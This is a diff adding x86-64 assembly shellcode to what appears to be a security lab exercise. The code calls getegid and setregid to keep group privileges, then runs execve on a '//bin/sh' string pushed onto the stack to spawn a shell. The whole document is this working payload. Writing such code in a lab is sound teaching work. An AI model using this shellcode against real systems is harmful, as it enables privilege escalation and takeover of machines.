@@ -1,0 +1,26 @@
+ // WORK HERE:
+    // run ret = getegid()
+    xor %rax,%rax
+    mov $SYS_getegid,%al
+    syscall
+    // run setregid(ret, ret);
+    mov %rax,%rdi
+    mov %rax, %rsi
+    xor %rax,%rax
+    mov $SYS_setregid, %al
+    syscall
+    // build the "//bin/sh" string here.
+    // set arguments.
+    // call execve.
+    xor %rax,%rax
+    mov %rax,%rsi
+    mov %rax,%rdx
+    push %rax
+    mov $SYS_execve, %al
+    mov $0x68732f6e69622f2f, %rbx
+    push %rbx
+    mov %rsp,%rdi
+    syscall
+    // system call: 'int $0x80' in 32 bit, 'syscall' in 64 bit
+
+
